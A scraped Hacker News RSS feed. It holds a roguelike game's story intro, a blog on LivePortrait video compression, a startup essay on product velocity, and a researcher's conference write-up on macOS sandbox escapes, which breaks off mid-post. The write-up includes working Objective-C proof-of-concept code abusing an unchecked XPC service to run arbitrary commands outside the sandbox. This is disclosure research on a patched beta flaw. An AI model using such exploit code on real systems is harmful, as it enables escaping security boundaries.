                    You can try out a beta version of λ-2D <a href="https://l-2d.glitch.me/">online here</a>. The source code for the parser and editor will shortly be available on GitHub.
                </p>
    </div>

    
        



    
</div>

                

                

                
                    


    


 




                

                
                
                
            
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Asterogue, my sci-fi roguelike, is now playable on the web (194 pts)]]></title>
            <link>https://asterogue.com</link>
            <guid>42085036</guid>
            <pubDate>Fri, 08 Nov 2024 07:43:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://asterogue.com">https://asterogue.com</a>, See on <a href="https://news.ycombinator.com/item?id=42085036">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="story-text"><div><p>One thousand years of peace and prosperity in the galaxy have come to an end.</p><p>You, a humble lightswords-person, lost everything you loved in The Great War.</p></div><div><p>Late one night in the midst of the Dark Times you drowned your sorrows at a dive bar.</p><p>An old man mumbled a mythical tale. "Ancient aliens have returned".</p></div><div><p>He told of their dark arts and strange ambitions.</p><p>To suck away all that is good in the galaxy and store it in their Cursed Orb.</p></div><p><span></span> The Orb of the ancients is the source of all this misery, and whoever finds it shall bring peace.</p><div><p>He sketched a space-map on the back of a napkin, and was suddenly gone.</p><p>From your haze you stared at the map and knew it to be your destiny.</p></div><div><p>Days later, wheeling through the outer limits of the spiral arm, you crash land upon an asteroid.</p><p>Is this the one on the map? Is that an entrance you spy?</p></div><div><p>Faced with sure death on the surface or the chilling unknown within, the choice is clear.</p><p>You descend into the heart of the asteroid...</p></div><p id="story-next">Next</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Perceptually lossless (talking head) video compression at 22kbit/s (167 pts)]]></title>
            <link>https://mlumiste.com/technical/liveportrait-compression/</link>
            <guid>42084977</guid>
            <pubDate>Fri, 08 Nov 2024 07:30:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mlumiste.com/technical/liveportrait-compression/">https://mlumiste.com/technical/liveportrait-compression/</a>, See on <a href="https://news.ycombinator.com/item?id=42084977">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      
        <header>
          
          

  <p>
    
      
      <span>
        
        
        <time datetime="2024-11-07T00:00:00+02:00">November 7, 2024</time>
      </span>
    

    <span></span>

    
      
      

      <span>
        
        
          8 minute read
        
      </span>
    
  </p>


        </header>
      

      <section itemprop="text">
        
        <p>Update: <a href="https://news.ycombinator.com/item?id=42084977">Discussion on Hacker News</a></p>

<p>I’ve been having quite a bit of fun with the fairly recent <a href="https://github.com/KwaiVGI/LivePortrait">LivePortrait</a> model, generating deepfakes of my friends for some cheap laughs.</p>

<p><img src="https://mlumiste.com/assets/images/compression/elon.gif" alt=""></p>

<p><em>The inevitable Elon Musk deepfake, picture by <a href="https://www.debbierowe.com/corporate">Debbie Rowe</a></em></p>

<p>The emerging field of 2D avatar/portrait animation (being able to animate any still image, avoiding the need to render cumbersome 3D models that would struggle with small facial details) is a harbinger of things to come. In the best case, it will be ubiquitous on social media (the authors have already added an extension to animate cute animal faces) and in the worst, trust on the internet will be heavily undermined. But one overlooked use case of the technology is (talking head) video compression. After all, <a href="http://prize.hutter1.net/hfaq.htm#compai">prediction is compression</a>, so a sufficiently powerful face generator should be able to compress frame information into an extremely sparse set of cues to reconstruct the same frame from.</p>

<p>This was briefly explored in Nvidia’s seminal <a href="https://nvlabs.github.io/face-vid2vid/">facevid2vid</a> paper that compared their models’ compression ratio to the classical H.264 codec. The main idea is quite simple: given a source image that is shared between the sending and receiving side, the only information that needs to be transmitted is the change in expression, pose and facial keypoints. The receiving side then simply animates the source frame into the new one, using these motion parameters.</p>

<p><img src="https://mlumiste.com/assets/images/compression/facevid2vid.png" alt=""></p>

<p>The main upside is that this method achieves pretty reasonable perceptual quality at an extremely low bitrate, while at a comparable level a traditional video codec will show heavy artifacts. There are, of course, downsides as well:</p>

<ul>
  <li>there is no longer a natural lever to trade-off between quality and bitrate, like the <a href="https://trac.ffmpeg.org/wiki/Encode/H.264">CRF</a> for H.264.</li>
  <li>as a model with large generative capacity, there’s essentially no limit to how bad the worst case reconstruction can be. It could in theory render a completely different person, or distort your face into a monstrous gremlin.</li>
  <li>the impressive bitrate does not come for free, as e.g. LivePortrait needs to run on an RTX 4090 for real-time processing. In the space of possible learned compression models, compared to something like <a href="https://github.com/microsoft/DCVC">DCVC</a>, it is a further improvement in compression rate, at the cost of having a 10x+ slower model.</li>
</ul>

<p>Anyway, LivePortrait is a beefed up version of facevid2vid, so let’s look at how good it is for video compression. I extracted the first frame of the above driving video as a key frame, simulating a scenario where instead of a high quality enrolled image, key frames are extracted on-demand in the background. This means that in addition to being same identity animation, this is also same video animation - by far the simplest scenario to work on for the model, as you have very good alignment between the source and driving frames. It’s also the closest to a drop-in replacement of the current video call experience. Here are the results of a quick try:</p>

<p><img src="https://mlumiste.com/assets/images/compression/self.gif" alt=""></p>

<p><em>Self-animation, i.e. driving a keyframe of the video with the motion</em></p>

<p>It’s possible to uncover discrepancies in a side by side analysis:</p>

<ul>
  <li>the head tends to be a bit shaky in all my experiments, probably because LivePortrait processes frames in isolation, without any motion prior. Or maybe my driving video is low quality. 🤷</li>
  <li>since the eye gaze is off camera in the key frame (“neutral mode”), the model seems to map it incorrectly in every frame after that.</li>
  <li>teeth are generally hallucinated, but this is only noticeable in smiling videos.</li>
</ul>

<p>As expected, the discrepancies are much more obvious if we provide a driving video with shoulder movement and difficult head angles. Also, the further the inference setup is from the training one (which is same video animation), the worse the results.</p>

<p>Nonetheless, it’s clear that there is a set of frames, arguably a large proportion of video-conferencing, where the model manages to produce subjectivelly distinguishable reconstructions. Sure, in a side by side analysis we might be able to tell which is the original and which is the reconstruction. However, if you are only looking at the generated output, it works very well.</p>

<p>So how small is the bitrate of this reconstruction? The model equation for transforming the face keypoints is:</p>

\[x_d = s_d \times (x_{c, s} R_d + \delta_d) + t_d\]

<p>where $x_{c, s} \in \mathbb{R}^{K \times 3}$ are the “canonical” implicit 3D facial keypoints of the source image, $R_d \in \mathbb{R}^{3 \times 3}$ is a 3D <a href="https://en.wikipedia.org/wiki/Rotation_matrix#In_three_dimensions">rotation matrix</a> (relative to the canonical keypoints), $\delta_d \in \mathbb{R}^{K \times 3}$ denotes the expression deformations, $t_d \in \mathbb{R}^3$ is a translation vector and $s_d$ is just a scaling coefficient and $K$, the number of keypoints, is a hyperparameter. The intuition of this equation is provided in the Nvidia paper:</p>

<p><img src="https://mlumiste.com/assets/images/compression/rotation.png" alt=""></p>

<p>Of course, $x_d$ is not yet the final reconstruction of the image, only the transformed keypoints. There are some flow field estimations and warp operations remaining to actually turn the source image into the driving one. Nonetheless, the sender only needs to transmit $s_d$, $R_d$, $\delta_d$ and $t_d$ for a lifelike reconstruction to happen on the receiver’s side.</p>

<p>And since we know their shapes, we can also infer the bitrate: $3 \times 3 +  K \times 3 + 3 = 75 $ numbers at $ K = 21 $, the default LivePortrait setting. At half precision floats, that’s $ 16 \times 75 \times 30 $ bits per second for a 30FPS video, or 36kbit/s. This could be compressed further - note that each frame is processed in isolation. This could be alleviated with entropy coding and having a temporal prior. In facevid2vid, simple entropy coding reduced the baseline model’s bitrate by nearly 40%, while using an adaptive number of keypoints reduced it by 60%. Using the first figure, we should be able to bring down LivePortrait’s bitrate to about 22kbit/s. For reference, the low bitrate challenge in <a href="https://www.compression.cc/leaderboard/video_0_05/test/">CLIC 2024</a> featured video compression at 50kbit/s, but as expected, the models showed significantly worse subjective quality scores than at 500kbit/s.</p>

<p>LivePortrait has roughly the same bitrate as the facevid2vid had (model transmits similar information), but achieving better results. Looking at the evaluation results for the latter method, we see that as expected, their model only provides a single point on the bitrate-quality curve. So without any evaluation results at hand, I would expect LivePortrait to move strictly downwards, matching a lower H.264 CRF for equal preference. Extrapolating ahead, a future model might achieve the same perceptual quality as a visually lossless CRF (FFmpeg suggests 17 or 18). Then, it is up to the user whether they want to squeeze bitrate to near zero at the cost of compute.</p>

<p><img src="https://mlumiste.com/assets/images/compression/bdrate.png" alt=""></p>

<h2 id="how-does-it-work-what-is-the-magic">How does it work (what is the magic?)</h2>

<p>The main problem of frame animation is that we are projecting a 3D object to a 2D image. So our model needs to understand the rotation and deformation of the underlying object. The good thing about faces is that they are rigid, i.e. tends to have limited degrees of freedom in movement and nearby pixels move together in predictable ways. Nonetheless, this has proven to be a hard problem.</p>

<p>The main innovation of facevid2vid, that also powers LivePortrait, was realising that this can be formed as a 3D rotation problem. By rotating a set of abstract 3D tensors enough times, the model learns to actually map these to keypoints of the face, as if someone would have painstakingly labelled them for each frame. Up until then, models like <a href="https://aliaksandrsiarohin.github.io/first-order-model-website/">First Order Motion Model</a> had also used the implicit keypoints approach, but only with 2D keypoints.</p>

<p>The second thing that seems to work is quite humdrum: compared to facevid2vid, LivePortrait has seriously scaled up the training dataset to 69 million high quality frames, and added regional GAN losses that focus only on the local regions like the face or the lips. So rather than any architectural breakthrough, it seems to have been a lot of iterative improvements on dataset and losses.</p>

<p>While being able to learn facial keypoints self-supervisedly is a testament to why deep learning is cool, it also allows direct controllability of the avatar. Since the rotation matrix has a direct geometric interpretation, you can input parameters for a required pose. LivePortrait adds on top of this by training small neural networks to control lip and eye movement. This is a big step ahead in terms of avatar controllability which generally has not been a strong suit of many generative approaches (I’m looking at you, diffusion).</p>

<p>LivePortrait methodology is quite different from SotA learned video compression models like <a href="https://github.com/microsoft/DCVC">DCVC</a>, which need to encode spatial information with a great degree of fidelity targeting pixel-aligned distortion losses such as MSE. A generative model unencumbered by pixel-alignment and optimised for various GAN based perceptive losses, only tries to generate something plausible. On a spectrum of model architectures, it achieves higher compression efficiency at the cost of model complexity. Indeed, the full LivePortrait model has 130m parameters compared to DCVC’s 20 million. While that’s tiny compared to LLMs, it currently requires an Nvidia RTX 4090 to run it in real time (in addition to parameters, a large culprit is using expensive warping operations). That means deploying to edge runtimes such as Apple Neural Engine is still quite a ways ahead.</p>

<p>Nonetheless, models and hardware become faster reliably quickly. Also, the same identity animation problem is significantly easier than animating Elon Musk or your cat, so probably a model optimised for teleconferencing could be remarkably smaller. That’s why it might not be that much of a moonshot. Publicly, Zoom seems to have played with the idea of <a href="https://www.business-standard.com/technology/tech-news/zoom-expands-ai-features-introduces-custom-avatars-and-upgraded-companion-124101000315_1.html">avatar technology</a>. I’ll let the precise use cases be determined by product people, but off the top of my head:</p>

<ul>
  <li>having a more formal version of yourself avatar for days when youre working in your underwear</li>
  <li>animating a 4k studio quality avatar from a driving video from my terrible webcam</li>
  <li>using pose and gaze connection to seat the avatars in some kind of more immersive virtual meeting room</li>
  <li>letting your avatar attend meetings / send messages as a digital twin. If all the driving keypoints are directly manipulatable, you could programmatically control a photorealistic video.</li>
</ul>

<p>Of course it’s possible that none of these will be useful or socially normalised, yet its fun to theorise.</p>

        
      </section>

      

      
  

    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Methodology is bullshit: principles for product velocity (210 pts)]]></title>
            <link>https://ssoready.com/blog/from-the-founders/methodology-is-bullshit/</link>
            <guid>42084753</guid>
            <pubDate>Fri, 08 Nov 2024 06:48:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ssoready.com/blog/from-the-founders/methodology-is-bullshit/">https://ssoready.com/blog/from-the-founders/methodology-is-bullshit/</a>, See on <a href="https://news.ycombinator.com/item?id=42084753">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>
            Building the right thing shouldn't take very long -- doing away with nonsense makes product development really fast"
        </p><div>
            <p>We’ve begun preparations for a major product launch. For us, it’s a big deal; it’s exciting. It’s a really big commitment. It’s also the kind of thing that threatens to become a quagmire, a set of features perpetually in-development.</p>
<p>We’ve found that making the right thing – something people want – is <em>intrinsically</em> quite fast. By contrast, it’s all the other stuff that slows down product teams. It’s process, it’s distance between deciders and doers, it’s bloated specifications.</p>
<p>With this in mind, I’ve realized that our company has developed – largely by accident – some general principles for achieving product velocity. Some of these may be wrong, and we’ll likely change our perspectives over time, but I thought I’d share them here nonetheless.</p>
<h2 id="principles-for-product-velocity">Principles for product velocity</h2>
<h2 id="we-should-probably-do-less">We should probably do less</h2>
<p>All else being equal, there’s usually a trade-off between speed and quality. For the most part, doing something faster usually requires a bit of compromise. There’s a corner getting cut somewhere.</p>
<p>But all else need not be equal. We can often eliminate requirements … and just do less stuff. With sufficiently limited scope, it’s usually feasible to build something quickly and to a high standard of quality.</p>
<p>Most companies assign requirements, assert a deadline, and treat quality as an output. We tend to do the opposite. Given a standard of quality, what can we ship in 60 days?</p>
<p>Recent escapades notwithstanding, Elon Musk has a similar <a href="https://medium.com/@cclark.osi/use-teslas-five-step-production-algorithm-to-improve-your-own-processes-d3c5bd427f37">thought process here</a>. Before anything else, an engineer should <em>make the requirements less dumb.</em></p>
<h2 id="idiot-mode-usually-works">Idiot mode usually works</h2>
<p>We’re big fans of the midwit meme. Put simply, the midwit meme usually shows an idiot and a genius agreeing on a simple solution, while a person of average intelligence flails around complaining about complicated stuff.</p>
<figure>
<p><img src="https://ssoready.com/blog/from-the-founders/methodology-is-bullshit/midwit.png">
</p>
</figure>
<p>Early in our company’s history, we challenged ourselves to operate in idiot mode as often as possible. When we’ve made mistakes, we’ve usually been overthinking things. We often arrive at a workable solution by asking ourselves, <em>how would I do this if I were an idiot</em>.</p>
<h2 id="some-problems-arent-important">Some problems aren’t important</h2>
<p>A small number of problems matter a lot. For example, we have to take security extremely seriously. It’s really not okay for us to cut corners there.</p>
<p>But we can choose to ignore certain other things. For example, we know that our front-end doesn’t look very good on mobile devices. For the foreseeable future, we’ll just need our customers not to use mobile devices. We’d obviously like for our software to look great everywhere, but we’re choosing not to spend time on our mobile layout. No one really seems to mind.</p>
<p>I’ll be damned if we ship dark mode any time soon.</p>
<h2 id="just-make-the-thing">Just make the thing</h2>
<p>We don’t have a process for product development. We don’t do Figma mocks. We don’t write PRDs. We don’t really have a design system. We don’t do <em>agile</em>. We don’t have OKRs. We don’t even have a firm product roadmap. We don’t have any A/B testing or growth hacks.</p>
<p>Our customers are engineers, so we generally expect that our engineers can handle product, design, and all the rest. We don’t need to have a whole committee weighing in.</p>
<figure>
<p><img src="https://ssoready.com/blog/from-the-founders/methodology-is-bullshit/peopleskills.jpg">
</p>
</figure>
<p>We just make things and see whether people like them.</p>
<h2 id="rewrites-need-to-happen-sometimes">Rewrites need to happen sometimes</h2>
<p>Companies often think they’ll move faster if they defer technical debt as long as possible. That’s sometimes fine, but we’re comfortable doing major rewrites when appropriate.</p>
<p>Sometimes the fastest path to building the right thing looks like this:</p>
<ol>
<li>Build the wrong thing</li>
<li>Realize it’s the wrong thing</li>
<li>Replace the wrong thing with the right thing</li>
</ol>
<p>If it seems reasonably useful to eliminate technical debt, we’ll do it.</p>
<h2 id="pay-vendors-to-do-it">Pay vendors to do it</h2>
<p>When possible, we buy solutions from vendors instead of building things in-house. For example, we use a vendor called Fern to generate our SDKs. They do a pretty good job.</p>
<p>Of course, using a vendor has significant upfront costs – these things are usually pretty expensive. It also restricts our freedom a bit.</p>
<p>But using a vendor is typically the right move. We have very limited engineering resources, and our engineering resources are really expensive. A week of a single engineer’s time costs about $5,000 in cash. It’s worth <em>vastly</em> more than that when we factor in opportunity costs (i.e. how much better off we’d be if we spent that engineer’s time on something else).</p>
<p>Relatively few things are actually worth building.</p>
<h2 id="dont-hire-people">Don’t hire people</h2>
<p>We don’t expect that adding headcount would increase our team’s output. Hiring is slow and hard. Onboarding and people management consume time. Even for a ramped hire, collaboration’s expensive.</p>
<p>It’s especially hard to bring on <em>strong</em> people, the kind of people that can contribute without a lot of support.</p>
<p>So although we have the resources to build a large engineering team, we do everything possible to stay small. It just makes life a lot easier.</p>


<h2 id="closing-thoughts">Closing thoughts</h2>
<p>To an extent that wasn’t obvious to us before, we’ve realized that product development shouldn’t take very long. If you know what your customers need, have a strong team, and avoid distracting nonsense, velocity is pretty close to inevitable.</p>

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Multiple new macOS sandbox escape vulnerabilities (378 pts)]]></title>
            <link>https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/</link>
            <guid>42084588</guid>
            <pubDate>Fri, 08 Nov 2024 06:10:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/">https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/</a>, See on <a href="https://news.ycombinator.com/item?id=42084588">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    <p>This is a blog post for my presentation at the conference <a href="https://powerofcommunity.net/2024.htm">POC2024</a>. The slides are uploaded <a href="https://github.com/jhftss/jhftss.github.io/blob/main/res/slides/A%20New%20Era%20of%20macOS%20Sandbox%20Escapes.pdf">here</a>.</p>

<p>In the macOS system, most processes are running in a restricted sandbox environment, whether they are Apple’s own services or third-party applications. Consequently, once an attacker gains Remote Code Execution (RCE) from these processes, their capabilities are constrained. The next step for the attacker is to circumvent the sandbox to gain enhanced execution capabilities and broader file access permissions.</p>

<p>But how to discover sandbox escape vulnerabilities? Upon reviewing the existing issues, I unearthed a significant <strong>overlooked attack surface</strong> and a novel attack technique. This led to the discovery of <strong>multiple new sandbox escape vulnerabilities</strong>: CVE-2023-27944, CVE-2023-32414, CVE-2023-32404, CVE-2023-41077, CVE-2023-42961, CVE-2024-27864, CVE-2023-42977, <strong>and more</strong>.</p>

<h2 id="about-the-macos-sandbox">About the macOS Sandbox</h2>

<h3 id="the-app-sandbox">The App Sandbox</h3>

<p>Nowadays, as required by the Mac AppStore, most applications are running with the <strong>App Sandbox</strong> restrictions. The sandboxed application must have the entitlement “<strong>&lt;key&gt;com.apple.security.app-sandbox&lt;/key&gt;&lt;true/&gt;</strong>”. The sandbox restrictions are applied in the <strong>dyld initialization</strong> function before the app’s main function. After entering the sandbox, it will be <strong>containerized</strong> and all the file operations will be limited to its data container path.</p>

<p>It should be noted that all the files dropped by the sandboxed application will be marked as <strong>quarantined by default</strong>. The dropped files will have the special <strong>quarantine extended attribute</strong>. And the extended attribute can’t be removed by the sandboxed app due to the configuration in the sandbox profile:</p>

<div><pre><code>(deny file-write-xattr (xattr "com.apple.quarantine") (with no-log)))
</code></pre></div>

<p>According to the Apple’s design guide:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019161759137.png" alt="image-20241019161759137"></p>

<p>The applications without App Sandbox have unrestricted access to all user data and system resources. While the applications with the sandbox restrictions have only limited access.</p>

<p>Specifically, the capabilities of a sandboxed application are defined in the rule configuration file <code>/System/Library/Sandbox/Profiles/application.sb</code>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019162228998.png" alt="image-20241019162228998"></p>

<p>For example, it will restrict access to certain <strong>system resources</strong> such as network and hardware. It also restricts the <strong>filesystem access</strong> and only a limited number of <strong>Mach services</strong> are reachable from a sandboxed application.</p>

<p>BTW, the <strong>forked</strong> child process will also <strong>inherit</strong> the application sandbox restrictions of the parent process. But the process launched via the <code>LaunchService.framework</code> <strong>don’t inherit</strong> the sandbox restriction. For example, you can launch a non-sandboxed application via the system <code>open</code> command directly.</p>

<h3 id="the-service-sandbox">The Service Sandbox</h3>

<p>Compared to the common application sandbox, the <strong>Service Sandbox</strong> is a bit different.</p>

<p>Most Apple’s <strong>daemon services</strong> are running in a <strong>Service Sandbox</strong> context. They are restricted by the sandbox profiles defined in these system locations:</p>

<div><pre><code>/System/Library/Sandbox/Profiles/*.sb
/usr/share/sandbox/*.sb
</code></pre></div>

<p>The sandbox restrictions are applied in the service’s <code>main</code> function by calling the API <code>sandbox_init_XXX</code>, specified with a sandbox profile name or path <strong>manually</strong>. After entering the sandbox, they are usually <strong>not containerized</strong>.</p>

<p>Most importantly, the dropped files are <strong>not quarantined by default</strong>, unless the <strong>quarantine-related</strong> APIs are invoked <strong>manually</strong>.</p>

<h2 id="the-attack-surfaces">The Attack Surfaces</h2>

<h2 id="the-old-common-ways">The Old Common Ways</h2>

<h3 id="attack-via-the-launchserviceframework">Attack via the LaunchService.framework</h3>

<p>The first common method is to attack the non-sandboxed applications via the system LaunchService framework.</p>

<p>The application could natively exist on the macOS system, an example is the <a href="https://i.blackhat.com/EU-21/Wednesday/EU-21-Waisberg-Skeletons-In-The-App-Sandbox.pdf">CVE-2021-30864</a>, which can manipulate the <strong>$HOME</strong> environment variable for the system non-sandboxed application <strong>Terminal.app</strong>. When the Terminal application is launched, the malicious payload under the controlled home path <code>$HOME/.profile</code> will be executed without the sandbox restriction.</p>

<p>Another attack scenario is to <strong>drop a new non-sandboxed application</strong> and then launch it. However, the newly dropped application will be <strong>quarantined</strong> and prevented from launching! So if we can drop a file or folder without being quarantined, then we can bypass the app sandbox completely. The example is the <a href="https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html">CVE-2023-32364</a>, which abuses the <strong>devfs</strong> to drop a folder without being quarantined because the <strong>devfs</strong> doesn’t support the extended attributes.</p>

<h3 id="attack-the-available-mach-services">Attack the available Mach services</h3>

<p>The second common way to escape the sandbox is to attack the available Mach services listed in the app sandbox profile.</p>

<p>All Mach service information on the system is stored in the file <code>/System/Library/xpc/launchd.plist</code>. And we can check if a Mach service is available to a sandboxed application by using the <code>bootstrap_look_up</code> API. So, it’s easy for us to enumerate all the Mach services available to app sandbox like this:</p>

<div><pre><code>void checkService(const char *serviceName) {
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &amp;service_port);
    if (!err) {
      NSLog(@"available service:%s", serviceName);
      mach_port_deallocate(mach_task_self_, service_port);
    }
}

void print_available_xpc(void) {
    NSDictionary&lt;NSString*, id&gt;* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
    NSDictionary&lt;NSString*, id&gt;* launchDaemons = dict[@"LaunchDaemons"];
    for (NSString* key in launchDaemons) {
      NSDictionary&lt;NSString*, id&gt;* job = launchDaemons[key];
      NSDictionary&lt;NSString*, id&gt;* machServices = job[@"MachServices"];
      for (NSString* serviceName in machServices) {
          checkService(serviceName.UTF8String);
      }
    }
}
</code></pre></div>

<p>Note that these Mach services exist either in the <strong>System domain</strong> or the <strong>User domain</strong>.</p>

<p>More XPC services available to app sandbox are ignored by our researchers!</p>

<h2 id="the-new-overlooked-one">The New Overlooked One</h2>

<p>The overlooked XPC services are those that exist in the <strong>PID domain</strong>.</p>

<p>In contrast to old common XPC services that exist in the <strong>System/User domain</strong>, their service type is “<strong>Application</strong>” type rather than the “<strong>System</strong>” or “<strong>User</strong>” type. And they will be launched upon request by an app and terminate when the requesting application exits.</p>

<p>The XPC services for the <strong>System/User domain</strong> are reachable to a sandboxed application only if they are defined in the sandbox profile “<strong>application.sb</strong>”. But all XPC services required by an app and its framework are visible to the app’s <strong>PID domain</strong>.</p>

<p>It seems that most XPC services for the <strong>PID domain</strong> are not expected to be invoked from a sandboxed application, so there are no additional entitlement checks or sandbox checks for the incoming XPC clients.</p>

<p>I drew a table to explain their differences:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019165127768.png" alt="image-20241019165127768"></p>

<p>Let’s take the <code>SystemShoveService.xpc</code> as an example:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019165457530.png" alt="image-20241019165457530"></p>

<p>It is an XPC bundle inside the system private <code>ShoveService.framework</code>. From the infoPlist dictionary, we can see that its “Service Type” is “<strong>Application</strong>” and its bundle identifier is “<strong>com.apple.installandsetup.shoveservice.system</strong>”.</p>

<p>So, how to send requests to this XPC service from a sandboxed application?</p>

<p>Through my research, I found that registering the XPC service to a sandboxed application’s PID domain is as simple as a single line of code:</p>

<div><pre><code>[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
</code></pre></div>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019170019639.png" alt="image-20241019170019639"></p>

<p>From the call stack backtrace of bundle loading, we can see that the XPC service will be <strong>registered</strong> to the app’s PID domain <strong>automatically when the corresponding framework is loaded</strong>.</p>

<p><code>SystemShoveService.xpc</code> does’t check the requested XPC client, so it can be exploited to <strong>escape the app sandbox</strong> after loading the <code>ShoveService.framework</code>. Moreover, it has the powerful SIP-related entitlement “<strong>com.apple.rootless.install</strong>”, and thus it can be exploited to <strong>bypass the SIP protection at the same time</strong>.</p>

<p>The vulnerability has been designated as <strong>CVE-2022-26712</strong>. More details can be found from <a href="https://jhftss.github.io/CVE-2022-26712-The-POC-For-SIP-Bypass-Is-Even-Tweetable/">my previous blogpost</a>.</p>

<p>Generally speaking, all XPC services with the Service Type “<strong>Application</strong>” are <strong>potential targets</strong> to escape the app sandbox. So we can explore this overlooked attack surface by enumerating the XPC services in the system (private) frameworks:</p>

<div><pre><code>find /System/Library/Frameworks -name *.xpc
find /System/Library/PrivateFrameworks -name *.xpc
</code></pre></div>

<p>After discovering an XPC service for <strong>PID Domain</strong> that doesn’t check the incoming XPC client, we can attempt to attack the <strong>potential target</strong> by using the following two methods:</p>

<ol>
  <li>Drop an app <strong>folder</strong> without being quarantined. (Get a full sandbox escape like the <a href="https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html">CVE-2023-32364</a> did.)</li>
  <li>Drop a <strong>file</strong> without being quarantined. (A <strong>ZIP</strong> or <strong>DMG</strong> file that contains a non-sandboxed application.)</li>
</ol>

<p>After diving into the new overlooked attack surface, I managed to discover dozens of new sandbox escape vulnerabilities. Next are the details.</p>

<h2 id="new-vulnerabilities--exploitations">New Vulnerabilities &amp; Exploitations</h2>

<h2 id="beta-no-cve-1">Beta-No-CVE-1</h2>

<p>Apple just credited me in their <a href="https://support.apple.com/en-gb/120950">additional recognitions</a>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172223066.png" alt="image-20241019172223066"></p>

<p>You may wonder why there’s no CVE assigned for this vulnerability.</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019173439785.png" alt="image-20241019173439785"></p>

<p>According to Apple, “CVEs are only assigned to software vulnerabilities previously released to production and not to vulnerabilities for beta-only software.” This vulnerability <strong>only affects the macOS Sonoma Beta version</strong>.</p>

<h3 id="the-issue">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc
</code></pre></div>

<p>The XPC service can be launched without any sandbox restrictions.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020105753261.png" alt="image-20241020105753261"></p>

<p>The <code>SKRemoteTaskRunnerProtocol</code> has only one method</p>

<p>“<code>runTask:arguments:withReply:</code>”.</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020105834371.png" alt="image-20241020105834371"></p>

<p>This only XPC method is designed to execute an arbitrary command with the specified arguments:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020105909140.png" alt="image-20241020105909140"></p>

<p>At line 30, the <strong>executable path</strong> and <strong>arguments</strong> are controlled by the sandboxed XPC client. Therefore, an attacker can abuse this XPC method to execute an arbitrary system command directly without any sandbox restrictions.</p>

<h3 id="the-exploit-and-demo">The exploit and demo</h3>

<div><pre><code>@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
    [conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
    [conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
    [conn resume];
    
    [[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
        NSLog(@"run task result:%@, error:%@", bSucc, error);
    }];
}
</code></pre></div>

<p>Demo link: https://youtu.be/MYkdmFOUyFA</p>

<h3 id="the-patch">The patch</h3>

<p>Apple promptly resolved the vulnerability prior to releasing macOS Sonoma 14.0 by <strong>completely removing the vulnerable XPC service</strong> from the operating system.</p>

<h2 id="beta-no-cve-2">Beta-No-CVE-2</h2>

<p>There is no CVE assigned for this vulnerability too due to the same <strong>Beta-only</strong> reason.</p>

<p>Apple just credited me in their <a href="https://support.apple.com/en-gb/120950">additional recognitions</a>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172506665.png" alt="image-20241019172506665"></p>

<h3 id="the-issue-1">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc
</code></pre></div>

<p>The XPC service can be launched without any sandbox restrictions.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

